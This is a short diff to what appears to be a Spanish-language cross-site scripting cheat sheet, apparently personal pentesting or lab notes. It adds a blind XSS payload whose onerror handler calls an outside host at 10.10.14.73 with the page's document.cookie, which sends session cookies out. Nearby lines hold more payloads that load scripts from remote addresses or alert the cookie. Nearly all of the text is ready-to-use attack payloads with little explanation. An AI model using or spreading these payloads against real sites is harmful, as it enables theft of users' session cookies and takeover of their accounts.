@@ -23,6 +23,7 @@ Tomar en cuenta que cuando el js usa innerhtml los tags <script> no funcionan po
 <img src=x onerror=alert(document.cookie)>
 
 # Blind
+<img+src="http://10.10.14.73/service"+onerror=fetch("http://10.10.14.73/?c="+document.cookie)+/>
 <script src=http://10.10.14.236></script>
 '><script src=http://10.10.14.236></script>
 "><script src=http://10.10.14.236></script>
